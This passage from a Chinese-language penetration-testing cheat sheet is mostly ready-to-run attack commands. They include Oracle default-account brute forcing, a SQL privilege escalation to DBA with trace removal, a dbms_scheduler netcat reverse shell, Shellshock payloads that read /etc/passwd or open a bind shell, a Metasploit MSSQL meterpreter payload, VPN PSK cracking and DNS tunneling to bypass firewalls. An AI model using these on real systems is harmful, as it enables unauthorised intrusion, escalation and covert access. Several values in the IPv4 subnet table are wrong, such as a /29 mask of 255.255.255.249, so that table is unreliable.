<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g version -h TARGET</span><br><span class="line">nmap --script=oracle-tns-version</span><br></pre></td></tr></table></figure>
<h4 id="爆破Oracle账户"><a href="#爆破Oracle账户" class="headerlink" title="爆破Oracle账户"></a>爆破Oracle账户</h4><p>验证默认账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure>
<p>对Oracle TNS 运行nmap脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1521 -A TARGET</span><br></pre></td></tr></table></figure>
<h4 id="Oracle权限提升"><a href="#Oracle权限提升" class="headerlink" title="Oracle权限提升"></a>Oracle权限提升</h4><p>利用条件：</p>
<ul>
<li>Oracle必须暴露在互联网上</li>
<li>使用默认账户，如scott</li>
</ul>
<p>简明流程：</p>
<ul>
<li>创建函数</li>
<li>创建表 SYS.DUAL  的索引</li>
<li>刚刚建立的索引执行了SCOTT.DBA_X 函数</li>
<li>函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户</li>
<li>创建具有DBA权限的账户</li>
</ul>
<p>下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。</p>
<h5 id="使用NMAP-NSE脚本验证oracle数据库中的默认账户："><a href="#使用NMAP-NSE脚本验证oracle数据库中的默认账户：" class="headerlink" title="使用NMAP NSE脚本验证oracle数据库中的默认账户："></a>使用NMAP NSE脚本验证oracle数据库中的默认账户：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure>
<p>使用脆弱账号登陆（假设你发现了一个）。</p>
<h5 id="确认一个oracle用户的权限级别"><a href="#确认一个oracle用户的权限级别" class="headerlink" title="确认一个oracle用户的权限级别"></a>确认一个oracle用户的权限级别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select * from session_privs; </span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid </span><br><span class="line">curren_user is </span><br><span class="line">pragma autonomous_transaction; </span><br><span class="line">begin </span><br><span class="line">execute immediate &apos;grant dba to user1 identified by pass1&apos;;</span><br><span class="line">commit;</span><br><span class="line">return &apos;FOO&apos;;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
<h5 id="Oracle权限提升和访问DBA"><a href="#Oracle权限提升和访问DBA" class="headerlink" title="Oracle权限提升和访问DBA"></a>Oracle权限提升和访问DBA</h5><p>运行netcat，<code>netcat -nvlp 443</code> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&apos;BAR&apos;));</span><br></pre></td></tr></table></figure>
<h5 id="运行查询语句"><a href="#运行查询语句" class="headerlink" title="运行查询语句"></a>运行查询语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; Select * from session_privs;</span><br></pre></td></tr></table></figure>
<p>这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。</p>
<h5 id="移除利用痕迹："><a href="#移除利用痕迹：" class="headerlink" title="移除利用痕迹："></a>移除利用痕迹：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index exploit_1337;</span><br></pre></td></tr></table></figure>
<h5 id="获取Oracle反弹shell："><a href="#获取Oracle反弹shell：" class="headerlink" title="获取Oracle反弹shell："></a>获取Oracle反弹shell：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_scheduler.create_job( job_name    =&gt; &apos;MEH1337&apos;,job_type    =&gt;</span><br><span class="line">    &apos;EXECUTABLE&apos;,job_action =&gt; &apos;/bin/nc&apos;,number_of_arguments =&gt; 4,start_date =&gt;</span><br><span class="line">    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); </span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 1, &apos;TARGET-IP&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 2, &apos;443&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 3, &apos;-e&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 4, &apos;/bin/bash&apos;);</span><br><span class="line">dbms_scheduler.enable(&apos;rev_shell&apos;); </span><br><span class="line">end;</span><br></pre></td></tr></table></figure>
<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>枚举/发现</p>
<p>Nmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156</span><br></pre></td></tr></table></figure>
<p>Metasploit</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br></pre></td></tr></table></figure>
<h4 id="爆破-MSSQL登陆"><a href="#爆破-MSSQL登陆" class="headerlink" title="爆破 MSSQL登陆"></a>爆破 MSSQL登陆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/mssql/mssql_enum</span><br></pre></td></tr></table></figure>
<h4 id="Metasploit-MSSQL-Shell"><a href="#Metasploit-MSSQL-Shell" class="headerlink" title="Metasploit MSSQL Shell"></a>Metasploit MSSQL Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/mssql/mssql_payload</span><br><span class="line">msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="Plink-exe-隧道"><a href="#Plink-exe-隧道" class="headerlink" title="Plink.exe 隧道"></a>Plink.exe 隧道</h3><p>PuTTY Link  隧道</p>
<p>转发运程端口到本地地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:127.0.0.1:445 REMOTE-IP</span><br></pre></td></tr></table></figure>
<h3 id="跳板（Pivoting）"><a href="#跳板（Pivoting）" class="headerlink" title="跳板（Pivoting）"></a>跳板（Pivoting）</h3><h4 id="SSH-跳板（ssh-Pivoting）"><a href="#SSH-跳板（ssh-Pivoting）" class="headerlink" title="SSH 跳板（ssh Pivoting）"></a>SSH 跳板（ssh Pivoting）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip</span><br></pre></td></tr></table></figure>
<p>需在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p>
<p>利用SSH跳板跨越网络</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1</span><br></pre></td></tr></table></figure>
<p>需在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2</span><br></pre></td></tr></table></figure>
<p>在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1011</code></p>
<h4 id="Meterpreter-Pivoting"><a href="#Meterpreter-Pivoting" class="headerlink" title="Meterpreter Pivoting"></a>Meterpreter Pivoting</h4><h3 id="TTL-指纹识别"><a href="#TTL-指纹识别" class="headerlink" title="TTL 指纹识别"></a>TTL 指纹识别</h3><table>
<thead>
<tr>
<th>操作系统</th>
<th>TTL 值</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows</td>
<td><code>128</code></td>
</tr>
<tr>
<td>Linux</td>
<td><code>64</code></td>
</tr>
<tr>
<td>Solaris</td>
<td><code>255</code></td>
</tr>
<tr>
<td>Cisco / Network</td>
<td><code>255</code></td>
</tr>
</tbody>
</table>
<h3 id="IPv4-速查"><a href="#IPv4-速查" class="headerlink" title="IPv4 速查"></a>IPv4 速查</h3><h4 id="各类IP的地址范围"><a href="#各类IP的地址范围" class="headerlink" title="各类IP的地址范围"></a>各类IP的地址范围</h4><table>
<thead>
<tr>
<th>类别</th>
<th>IP 地址范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>A类</td>
<td><code>0.0.0.0 - 127.255.255.255</code></td>
</tr>
<tr>
<td>B类</td>
<td><code>128.0.0.0 - 191.255.255.255</code></td>
</tr>
<tr>
<td>C类</td>
<td><code>192.0.0.0 - 223.255.255.255</code></td>
</tr>
<tr>
<td>D类</td>
<td><code>224.0.0.0 - 239.255.255.255</code></td>
</tr>
<tr>
<td>E类</td>
<td><code>240.0.0.0 - 255.255.255.255</code></td>
</tr>
</tbody>
</table>
<h4 id="IPv4私有地址"><a href="#IPv4私有地址" class="headerlink" title="IPv4私有地址"></a>IPv4私有地址</h4><table>
<thead>
<tr>
<th>类别</th>
<th>范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>A类私有地址</td>
<td><code>10.0.0.0 - 10.255.255.255</code></td>
</tr>
<tr>
<td>B类私有地址</td>
<td><code>172.16.0.0 - 172.31.255.255</code></td>
</tr>
<tr>
<td>C类私有地址</td>
<td><code>192.168.0.0 - 192.168.255.255</code></td>
</tr>
<tr>
<td></td>
<td><code>127.0.0.0 - 127.255.255.255</code></td>
</tr>
</tbody>
</table>
<h4 id="IPv4子网速查表"><a href="#IPv4子网速查表" class="headerlink" title="IPv4子网速查表"></a>IPv4子网速查表</h4><p>和渗透测试关系不太大，但确实很有用。</p>
<table>
<thead>
<tr>
<th>CIDR</th>
<th>十进制掩码</th>
<th>主机数量</th>
</tr>
</thead>
<tbody>
<tr>
<td>/31</td>
<td><code>255.255.255.254</code></td>
<td><code>1 Host</code></td>
</tr>
<tr>
<td>/30</td>
<td><code>255.255.255.252</code></td>
<td><code>2 Hosts</code></td>
</tr>
<tr>
<td>/29</td>
<td><code>255.255.255.249</code></td>
<td><code>6 Hosts</code></td>
</tr>
<tr>
<td>/28</td>
<td><code>255.255.255.240</code></td>
<td><code>14 Hosts</code></td>
</tr>
<tr>
<td>/27</td>
<td><code>255.255.255.224</code></td>
<td><code>30 Hosts</code></td>
</tr>
<tr>
<td>/26</td>
<td><code>255.255.255.192</code></td>
<td><code>62 Hosts</code></td>
</tr>
<tr>
<td>/25</td>
<td><code>255.255.255.128</code></td>
<td><code>126 Hosts</code></td>
</tr>
<tr>
<td>/24</td>
<td><code>255.255.255.0</code></td>
<td><code>254 Hosts</code></td>
</tr>
<tr>
<td>/23</td>
<td><code>255.255.254.0</code></td>
<td><code>512 Host</code></td>
</tr>
<tr>
<td>/22</td>
<td><code>255.255.252.0</code></td>
<td><code>1022 Hosts</code></td>
</tr>
<tr>
<td>/21</td>
<td><code>255.255.248.0</code></td>
<td><code>2046 Hosts</code></td>
</tr>
<tr>
<td>/20</td>
<td><code>255.255.240.0</code></td>
<td><code>4094 Hosts</code></td>
</tr>
<tr>
<td>/19</td>
<td><code>255.255.224.0</code></td>
<td><code>8190 Hosts</code></td>
</tr>
<tr>
<td>/18</td>
<td><code>255.255.192.0</code></td>
<td><code>16382 Hosts</code></td>
</tr>
<tr>
<td>/17</td>
<td><code>255.255.128.0</code></td>
<td><code>32766 Hosts</code></td>
</tr>
<tr>
<td>/16</td>
<td><code>255.255.0.0</code></td>
<td><code>65534 Hosts</code></td>
</tr>
<tr>
<td>/15</td>
<td><code>255.254.0.0</code></td>
<td><code>131070 Hosts</code></td>
</tr>
<tr>
<td>/14</td>
<td><code>255.252.0.0</code></td>
<td><code>262142 Hosts</code></td>
</tr>
<tr>
<td>/13</td>
<td><code>255.248.0.0</code></td>
<td><code>524286 Hosts</code></td>
</tr>
<tr>
<td>/12</td>
<td><code>255.240.0.0</code></td>
<td><code>1048674 Hosts</code></td>
</tr>
<tr>
<td>/11</td>
<td><code>255.224.0.0</code></td>
<td><code>2097150 Hosts</code></td>
</tr>
<tr>
<td>/10</td>
<td><code>255.192.0.0</code></td>
<td><code>4194302 Hosts</code></td>
</tr>
<tr>
<td>/9</td>
<td><code>255.128.0.0</code></td>
<td><code>8388606 Hosts</code></td>
</tr>
<tr>
<td>/8</td>
<td><code>255.0.0.0</code></td>
<td><code>16777214 Hosts</code></td>
</tr>
</tbody>
</table>
<h3 id="VLAN-hopping（跳跃攻击）"><a href="#VLAN-hopping（跳跃攻击）" class="headerlink" title="VLAN hopping（跳跃攻击）"></a>VLAN hopping（跳跃攻击）</h3><p>使用nccgroup 的脚本简化攻击过程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/vlan-hopping.git</span><br><span class="line">chmod 700 frogger.sh</span><br><span class="line">./frogger.sh</span><br></pre></td></tr></table></figure>
<h3 id="VPN测试工具"><a href="#VPN测试工具" class="headerlink" title="VPN测试工具"></a>VPN测试工具</h3><p>识别VPN服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike TARGET(s)</span><br></pre></td></tr></table></figure>
<p>扫描VPN服务器网段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike -f ip.txt</span><br></pre></td></tr></table></figure>
<h4 id="IKEForce"><a href="#IKEForce" class="headerlink" title="IKEForce"></a>IKEForce</h4><p>使用IKEForce枚举或对 VPN 服务器进行字典攻击.</p>
<p>安装:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyip</span><br><span class="line">git clone https://github.com/SpiderLabs/ikeforce.git</span><br></pre></td></tr></table></figure>
<p>使用IKEForce对IKE VPN 进行枚举：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</span><br></pre></td></tr></table></figure>
<p>使用 IKEForce 爆破 IKE VPN:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ike-scan</span><br><span class="line">ike-scan TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key</span><br></pre></td></tr></table></figure>
<h4 id="IKE-激进模式-PSK-破解"><a href="#IKE-激进模式-PSK-破解" class="headerlink" title="IKE 激进模式 PSK 破解"></a>IKE 激进模式 PSK 破解</h4><ol>
<li>验证VPN服务器</li>
<li>使用 IKEForce 枚举来获得组ID</li>
<li>使用 ike-scan 从IKE 终端抓取 PSK 哈希 </li>
<li>使用 psk-crack 破解哈希</li>
</ol>
<h5 id="Step-1-验证IKE服务器"><a href="#Step-1-验证IKE服务器" class="headerlink" title="Step 1: 验证IKE服务器"></a>Step 1: 验证IKE服务器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike SUBNET/24</span><br></pre></td></tr></table></figure>
<h5 id="Step-2-使用IKEForce枚举组名"><a href="#Step-2-使用IKEForce枚举组名" class="headerlink" title="Step 2:使用IKEForce枚举组名"></a>Step 2:使用IKEForce枚举组名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</span><br></pre></td></tr></table></figure>
<h5 id="Step-3-使用ike-scan抓取PSK哈希"><a href="#Step-3-使用ike-scan抓取PSK哈希" class="headerlink" title="Step 3: 使用ike-scan抓取PSK哈希"></a>Step 3: 使用ike-scan抓取PSK哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP</span><br></pre></td></tr></table></figure>
<h5 id="Step-4-使用psk-crack-破解PSK-哈希"><a href="#Step-4-使用psk-crack-破解PSK-哈希" class="headerlink" title="Step 4: 使用psk-crack 破解PSK 哈希"></a>Step 4: 使用psk-crack 破解PSK 哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psk-crack hash-file.txt</span><br></pre></td></tr></table></figure>
<p>高级psk-crack 选项:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pskcrack</span><br><span class="line">psk-crack -b 5 TARGET-IPkey</span><br><span class="line">psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key</span><br><span class="line">psk-crack -d /path/to/dictionary-file TARGET-IP-key</span><br></pre></td></tr></table></figure>
<h4 id="PPTP-Hacking"><a href="#PPTP-Hacking" class="headerlink" title="PPTP Hacking"></a>PPTP Hacking</h4><p>验证PPTP服务 ，它以TCP协议在1723端口监听</p>
<h5 id="NMAP-PPTP-指纹识别"><a href="#NMAP-PPTP-指纹识别" class="headerlink" title="NMAP PPTP 指纹识别:"></a>NMAP PPTP 指纹识别:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –Pn -sV -p 1723 TARGET(S)</span><br></pre></td></tr></table></figure>
<h5 id="PPTP字典攻击"><a href="#PPTP字典攻击" class="headerlink" title="PPTP字典攻击"></a>PPTP字典攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</span><br></pre></td></tr></table></figure>
<h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。</p>
<h4 id="攻击机器："><a href="#攻击机器：" class="headerlink" title="攻击机器："></a>攻击机器：</h4><p>安装:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get -y install ruby-dev git make g++</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure>
<p>运行dnscat2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 1422</span><br><span class="line">dnscat2&gt; session -i 1422</span><br></pre></td></tr></table></figure>
<p>目标机器:</p>
<p><a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> </p>
<p><a href="https://github.com/lukebaggett/dnscat2-powershell/" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure>
<h2 id="BOF-Exploit"><a href="#BOF-Exploit" class="headerlink" title="BOF / Exploit"></a>BOF / Exploit</h2><h2 id="Exploit-搜索"><a href="#Exploit-搜索" class="headerlink" title="Exploit 搜索"></a>Exploit 搜索</h2><p>寻找枚举主机/服务的exp</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>`searchsploit windows 2003</td>
<td>grep -i local`</td>
<td>从 exploit-db搜索EXP, 这里以WIndows2003本地提权为例</td>
</tr>
<tr>
<td><code>site:exploit-db.com exploit kernel &lt;= 3</code></td>
<td>使用Google搜索exploit-db.com</td>
</tr>
<tr>
<td><code>grep -R &quot;W7&quot; /usr/share/metasploit-framework/modules/exploit/windows/*</code></td>
<td>用grep搜索metasploit的模块——因为msf的搜索有点差劲。</td>
</tr>
</tbody>
</table>
<h3 id="搜索EXP"><a href="#搜索EXP" class="headerlink" title="搜索EXP"></a>搜索EXP</h3><p>安装exploit-db的本地备份:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit –u</span><br><span class="line">searchsploit apache 2.2</span><br><span class="line">searchsploit &quot;Linux Kernel&quot;</span><br><span class="line">searchsploit linux 2.6 | grep -i ubuntu | grep local</span><br></pre></td></tr></table></figure>
<h3 id="在Kali上编译WIndows的exp"><a href="#在Kali上编译WIndows的exp" class="headerlink" title="在Kali上编译WIndows的exp"></a>在Kali上编译WIndows的exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line">cd /root/.wine/drive_c/windows</span><br><span class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line">cd /root/.wine/drive_c/MinGW/bin</span><br><span class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</span><br><span class="line">wine ability.exe</span><br></pre></td></tr></table></figure>
<h3 id="交叉编译Exploits"><a href="#交叉编译Exploits" class="headerlink" title="交叉编译Exploits"></a>交叉编译Exploits</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 bit)</span><br><span class="line">gcc -m64 -o output hello.c (64 bit)</span><br></pre></td></tr></table></figure>
<h3 id="利用通用漏洞"><a href="#利用通用漏洞" class="headerlink" title="利用通用漏洞"></a>利用通用漏洞</h3><h4 id="利用Shellshock漏洞"><a href="#利用Shellshock漏洞" class="headerlink" title="利用Shellshock漏洞"></a>利用Shellshock漏洞</h4><p>一个用来寻找和利用Shellshock漏洞的攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/shocker</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H TARGET  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</span><br></pre></td></tr></table></figure>
<h5 id="cat-file-查看文件内容"><a href="#cat-file-查看文件内容" class="headerlink" title="cat file (查看文件内容)"></a>cat file (查看文件内容)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure>
<h5 id="Shell-Shock-运行bind-shell"><a href="#Shell-Shock-运行bind-shell" class="headerlink" title="Shell Shock 运行bind shell"></a>Shell Shock 运行bind shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure>
<h5 id="Shell-Shock-反弹shell"><a href="#Shell-Shock-反弹shell" class="headerlink" title="Shell Shock 反弹shell"></a>Shell Shock 反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 443</span><br></pre></td></tr></table></figure>
<h2 id="简单的本地Web服务器"><a href="#简单的本地Web服务器" class="headerlink" title="简单的本地Web服务器"></a>简单的本地Web服务器</h2><p>使用Python命令运行本地Web服务，在接受反向shell和攻击目标机器是很方便。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m SimpleHTTPServer 80</code></td>
<td>运行一个基本的 http 服务,接受反弹shell等情况下很棒</td>
</tr>
<tr>
<td><code>python3 -m http.server</code></td>
<td>运行一个基本的 Python3 http 服务</td>
</tr>
<tr>
<td><code>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</code></td>
<td>运行一个基本的ruby http 服务</td>
</tr>
<tr>
<td><code>php -S 0.0.0.0:80</code></td>
<td>运行一个基本的 PHP http 服务</td>
</tr>
</tbody>
</table>
<h2 id="挂载文件共享"><a href="#挂载文件共享" class="headerlink" title="挂载文件共享"></a>挂载文件共享</h2><p>怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></td>
<td>挂载NFS共享到 <code>/mnt/nfs</code></td>
</tr>
<tr>
<td><code>mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs</code></td>
<td>挂载Windows CIFS / SMB 共享到 Linux 的 <code>/mnt/cifs</code> 。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码</td>
</tr>
<tr>
<td><code>net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no</code></td>
<td>使用命令行在Windows间挂载共享文件</td>
</tr>
<tr>
<td><code>apt-get install smb4k -y</code></td>
<td>在Kali上安装smb4k，方便从Linux的GUI查看SMB共享</td>
</tr>
</tbody>
</table>
<h2 id="HTTP-HTTPS-Web服务枚举"><a href="#HTTP-HTTPS-Web服务枚举" class="headerlink" title="HTTP / HTTPS Web服务枚举"></a>HTTP / HTTPS Web服务枚举</h2><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nikto -h 192.168.1.1</code></td>
<td>对目标使用 nikto 进行扫描</td>
</tr>
<tr>
<td><code>dirbuster</code></td>
<td>使用GUI配置，命令行不好使</td>
</tr>
</tbody>
</table>
<h2 id="数据包侦测"><a href="#数据包侦测" class="headerlink" title="数据包侦测"></a>数据包侦测</h2><table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></td>
<td>将网卡eth0的80端口的流量导出到output.pcap</td>
</tr>
</tbody>
</table>
<h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>一些用来枚举目标系统用户名的手法。</p>
